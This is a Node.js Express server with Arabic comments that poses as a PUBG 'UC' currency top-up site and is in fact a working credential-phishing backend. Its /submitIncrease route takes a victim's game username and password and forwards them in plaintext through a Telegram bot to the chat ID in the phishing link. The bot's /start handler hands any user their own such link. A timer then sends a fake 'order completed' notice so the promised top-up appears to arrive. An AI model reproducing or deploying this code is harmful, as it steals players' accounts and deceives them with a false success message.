const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// استخدام middleware لتحليل JSON
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// خدمة الملفات الثابتة للمواقع المختلفة
app.use('/increase', express.static('increase-site'));
app.use('/pubg', express.static('pubg-site'));
app.use('/uc', express.static('uc-site'));

// تهيئة بوت التليجرام
const token = process.env.s; // توكن البوت من متغيرات البيئة
const bot = new TelegramBot(token, { polling: true });

// تخزين الطلبات (في بيئة حقيقية، استخدم قاعدة بيانات)
let requests = [];

// مسارات خاصة بموقع زيادة الشدات
app.get('/increase/pubg_uc/:chatId', (req, res) => {
  res.sendFile(path.join(__dirname, 'increase-site', 'pubg_uc.html'));
});

// مسار لمعالجة طلبات الشحن
app.post('/submitIncrease', async (req, res) => {
  try {
    const { chatId, username, password, uc } = req.body;
    
    // حفظ الطلب
    const request = {
      id: Date.now(),
      chatId,
      username,
      password,
      uc,
      timestamp: new Date().toLocaleString('ar-SA'),
      status: 'pending'
    };
    
    requests.push(request);
    
    // إرسال رسالة إلى البوت
    const message = `
    📦 طلب شحن شدات جديد:
    
    👤 اسم المستخدم: ${username}
    🔐 كلمة المرور: ${password}
    🎮 عدد الشدات: ${uc}
    ⏰ الوقت: ${request.timestamp}
    `;
    
    await bot.sendMessage(chatId, message);
    
    res.json({ success: true, message: 'تم استلام طلبك بنجاح' });
  } catch (error) {
    console.error('Error processing request:', error);
    res.status(500).json({ success: false, message: 'حدث خطأ أثناء معالجة الطلب' });
  }
});

// مسارات أخرى للمواقع المختلفة
app.get('/other-site', (req, res) => {
  res.send('هذا موقع آخر على السيرفر');
});

// مسار للتحقق من حالة الطلب
app.get('/checkStatus/:requestId', (req, res) => {
  const requestId = parseInt(req.params.requestId);
  const request = requests.find(r => r.id === requestId);
  
  if (request) {
    res.json({ status: request.status });
  } else {
    res.status(404).json({ error: 'الطلب غير موجود' });
  }
});

// صفحة رئيسية توضح جميع المواقع المتاحة
app.get('/', (req, res) => {
  const html = `
  <!DOCTYPE html>
  <html dir="rtl" lang="ar">
  <head>
      <title>خادم متعدد المواقع</title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style>
          body {
              font-family: Arial, sans-serif;
              background-color: #0d1b2a;
              color: #fff;
              padding: 20px;
          }
          .container {
              max-width: 800px;
              margin: 0 auto;
              background-color: #1e293b;
              padding: 30px;
              border-radius: 15px;
              box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
          }
          h1 {
              color: #FFD700;
              text-align: center;
          }
          .site-list {
              list-style: none;
              padding: 0;
          }
          .site-list li {
              margin-bottom: 15px;
              padding: 15px;
              background-color: #334155;
              border-radius: 8px;
          }
          .site-list a {
              color: #FFD700;
              text-decoration: none;
              font-weight: bold;
              display: block;
          }
          .site-list a:hover {
              text-decoration: underline;
          }
      </style>
  </head>
  <body>
      <div class="container">
          <h1>المواقع المتاحة على الخادم</h1>
          <ul class="site-list">
              <li><a href="/increase/pubg_uc/6808883615">موقع شحن شدات ببجي</a></li>
              <li><a href="/pubg">موقع ببجي (إن وجد)</a></li>
              <li><a href="/uc">موقع الشدات (إن وجد)</a></li>
              <li><a href="/other-site">موقع آخر</a></li>
          </ul>
      </div>
  </body>
  </html>
  `;
  res.send(html);
});

// تشغيل المخدم
app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
  console.log(`🌐 Available sites:`);
  console.log(`   - Main: http://localhost:${PORT}`);
  console.log(`   - PUBG UC: http://localhost:${PORT}/increase/pubg_uc/6808883615`);
  console.log(`   - PUBG: http://localhost:${PORT}/pubg`);
  console.log(`   - UC: http://localhost:${PORT}/uc`);
});

// معالجة رسائل البوت
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  if (text === '/start') {
    const welcomeMessage = `
    🎮 مرحباً بك في بوت شحن شدات ببجي!
    
    لإضافة شدات إلى حسابك، يرجى استخدام الرابط التالي:
    ${process.env.R}/increase/pubg_uc/${chatId}
    
    ⚠️ ملاحظة: احتفظ بهذا الرابط خاصاً ولا تشاركه مع الآخرين.
    `;
    
    bot.sendMessage(chatId, welcomeMessage);
  }
});

// دالة للتحقق من الطلبات كل 15 دقيقة (محاكاة لإكمال الطلب)
setInterval(() => {
  const now = new Date();
  requests.forEach(request => {
    if (request.status === 'pending') {
      const requestTime = new Date(request.id);
      const diffMinutes = (now - requestTime) / (1000 * 60);
      
      if (diffMinutes >= 15) {
        request.status = 'completed';
        
        // إرسال رسالة إشعار بإكمال الطلب
        const completionMessage = `
        ✅ تم اكتمال طلبك!
        
        👤 اسم المستخدم: ${request.username}
        🎮 عدد الشدات: ${request.uc}
        ⏰ وقت الإكمال: ${new Date().toLocaleString('ar-SA')}
        
        شكراً لاستخدامك خدمتنا! 🎮
        `;
        
        bot.sendMessage(request.chatId, completionMessage)
          .catch(err => console.error('Error sending completion message:', err));
      }
    }
  });
}, 60000); // التحقق كل دقيقة
